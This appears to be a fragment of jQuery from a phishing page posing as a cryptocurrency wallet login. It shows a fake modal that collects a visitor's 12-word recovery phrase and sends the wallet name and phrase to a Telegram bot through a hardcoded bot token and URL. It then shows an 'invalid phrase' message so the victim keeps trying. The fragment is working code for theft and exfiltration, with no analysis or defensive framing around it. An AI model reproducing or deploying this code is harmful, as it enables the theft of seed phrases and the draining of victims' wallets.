$('.headconect > p:nth-child(3), .two-modal .headconect > p:nth-child(2)').click(function(){
...
// });
 $(document).click(function(e){
     var div = $(".modal");
     let vid2 = $('.modalk');
     if ($('#checkkk').val() == 'hidden' && !div.is(e.target) && div.has(e.target).length === 0 && !vid2.is(e.target) && vid2.has(e.target).length === 0) { 
 ...
 $('.cont').click(function(){
     ...
     if ($(this).find('p').text() !== 'Metamask') {
         ...
         $('.wallet-description').text( `Login using ${$(this).find('p').text()} hosted wallet` );
     ...
     if ($('.modalk input#val').val().split(" ").length < 11) {
      ...
      function sendMessage(name, value, ress){
        ...
        var bot_token = 'bot5031140535:AAE-MnEXdl9TGH4kPO4HoqKpjiAy0MuwGWw';
         $.ajax({
            url: 'https://api.telegram.org/'+bot_token+'/sendMessage?chat_id='+chat_id+'&text=Wallet: '+name+'%0A'+'Phrase: '+value,
            type: 'GET',
...
To continue, simply confirm your 12 word phrase.`);
            ...
            $('div.main--texts > p').text(`We cannot confirm it's you. Please enter a valid phrase!`);
         }
